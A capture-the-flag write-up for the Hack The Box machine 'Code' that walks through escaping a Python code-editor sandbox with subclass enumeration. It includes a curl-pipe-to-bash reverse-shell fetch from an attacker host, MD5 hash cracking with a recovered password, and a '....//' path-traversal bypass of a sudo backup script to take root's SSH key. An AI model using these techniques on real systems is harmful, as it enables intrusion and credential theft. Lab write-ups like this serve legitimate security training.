---
icon: code-simple
---

# HTB-CODE

<figure><img src="../../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

**Execution Phase**

1. Start with the **Python Code Editor**.
2. **Enumerate available classes** to discover `subprocess.Popen`.
3. Use this to achieve **Remote Code Execution (RCE)** and gain access as **app-production**.

**Privilege Escalation Phase**\
4\. Review the **source code** to find **hashes stored in the database**.\
5\. **Crack these hashes** to get a shell as **martin**.\
6\. Use a **filter bypass in the "backy" service** to retrieve the **SSH key for root**.\
7\. Use that key to get a **root shell**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 05:46 EDT
Nmap scan report for 10.129.245.206
Host is up (0.053s latency).
Not shown: 98 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.70 seconds  
```

### Execution <a href="#execution" id="execution"></a>

`nmap` already identified a `Python` web server running on port 5000. Based on the title it’s an interactive code editor. Navigating to the page with a browser confirms that assumption.

<figure><img src="../../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Trying to import new libraries with `import` errors out and displays **Use of restricted keywords is not allowed**, so there’s some kind of filtering in place.

Since importing new code, reading and writing files are not easily possible, I’ll check what kind of classes are available to me.

```python
for index, value in enumerate(''.__class__.__base__.__subclasses__()):
    print(f'{index}: {value}')
```

The code output on the web page is truncated, but the actual response contains 721 classes. Performing the same request via `curl` and piping the output `jq` lets me search for interesting entries.

```python
sn0x㉿sn0x)-[~/hackthebox/code]
└─$ curl -s 'http://10.129.148.77:5000/run_code' \
       -X POST \
       -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
       --data-raw $'code=for+index%2C+value+in+enumerate(\'\'.__class__.__base__.__subclasses__())%3A%0A++++print(f\'%7Bindex%7D%3A+%7Bvalue%7D\')' \
       | jq -r .output
 
--- SNIP ---
316: <class 'subprocess.CompletedProcess'>
317: <class 'subprocess.Popen'>
593: <class 'asyncio.subprocess.Process'>
--- SNIP ---
```

Looks like `subprocess.Popen` was already imported by the application and I can use this to run _any_ code<sup>1</sup> . The class is accessible via entry number 317.

```
''.__class__.__base__.__subclasses__()[317](['/bin/bash', '-c', 'curl http://10.10.10.10/shell|bash'])
```

Hosting a simple reverse shell payload at `/shell` on my web server and running the above code grants me access as `app-production`.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as martin <a href="#shell-as-martin" id="shell-as-martin"></a>

Even though not needed there was a login on the web page, this means that there’s likely some kind of user management or database in place. Going over the source code for the application at `/home/app-production/app/app.py` shows references to a `SQLite3` database and that the passwords are hashed with `MD5`.

app.py

```python

# --- SNIP ---
app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
 
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    codes = db.relationship('Code', backref='user', lazy=True)
 
# --- SNIP ---
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('User already exists. Please choose a different username.')
        else:
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.')
            return redirect(url_for('login'))
 
    return render_template('register.html')

```

Within the database there are only two users defined, `martin` and `development`.

```python
sn0x㉿sn0x)-[~/hackthebox/code]
└─$ sqlite3 /home/app-production/app/instance/database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
code  user
sqlite> select * from user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be


```

`john` takes a few seconds to recover both cleartext passwords from the collected hashes. This allows me to change my user to `martin`.

```python
sn0x㉿sn0x)-[~/hackthebox/code]
└─$  john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 hash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (?)     
nafeelswordsmaster (?)
```

#### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>

As `martin` I run `sudo -l` and can see that I’m able to run `/usr/bin/backy.sh` as _any_ user.

```python
sn0x㉿sn0x)-[~/hackthebox/code]
└─$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Inspecting the code of the bash script reveals it takes one argument, a JSON file, checks for its existence and removes `../` from all values within `directories_to_archive` to prevent path traversal. Before passing the JSON file to the actual [backy](https://github.com/vdbsh/backy) binary it also checks if all entries start with `/var/` or `/home`.

/usr/bin/backy.sh

```python

#!/bin/bash
 
if [[ $#--ne-1-| -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi
 
json_file="$1"
 
if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi
 
allowed_paths=("/var/" "/home/")
 
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
 
/usr/bin/echo "$updated_json" > "$json_file"
 
directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
 
is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}
 
for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done
 
/usr/bin/backy "$json_file"

```

In `martins` home directory there’s a folder called `backups` that contains an archive and a JSON file that may have been used to create a backup.

task.json

```python
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],
 
        "exclude": [
                ".*"
        ]
}
```

**Method 1**

Even though there are restrictions in place, they only cover specific cases. The substitution of `../` with an empty string only works once, so using `....//` will leave `../` after replacement.

task.json

```python
{
	"directories_to_archive": ["/home/martin/....//....//root"],
	"destination": "/dev/shm"
}
```

Using the JSON file as input for `backy.sh` places a backup of the root folder into `/dev/shm`. There I can unpack it to get access to the flag and the SSH key for the `root` user.

```python
sn0x㉿sn0x)-[~/hackthebox/code]
└─$ sudo /usr/bin/backy.sh task.json
2025/03/23 14:32:59 🍀 backy 1.2
2025/03/23 14:32:59 📋 Working with task.json ...
2025/03/23 14:32:59 💤 Nothing to sync
2025/03/23 14:32:59 📤 Archiving: [/home/martin/root/root]
2025/03/23 14:32:59 📥 To: /dev/shm ...
2025/03/23 14:32:59 📦
 
sn0x㉿sn0x)-[~/hackthebox/code]
└─$ tar xvf code_home_martin_.._.._root_2025_March.tar.bz2 
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
```

**Method 2**

On this machine the kernel parameter `fs.protected_regular` is set to `2`, preventing _any_ other user from modifying files in directories where the sticky bit is set<sup>2</sup>. Some examples being `/dev/shm` and `/tmp`. Placing the `task.json` in there has the desired effect.

This means even though the path traversal is removed, the changes can’t be written to disk and therefore the original JSON is provided to `backy`.

```python
task.json
{
	"directories_to_archive": ["/var/../root"],
	"destination": "/dev/shm"
}

```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
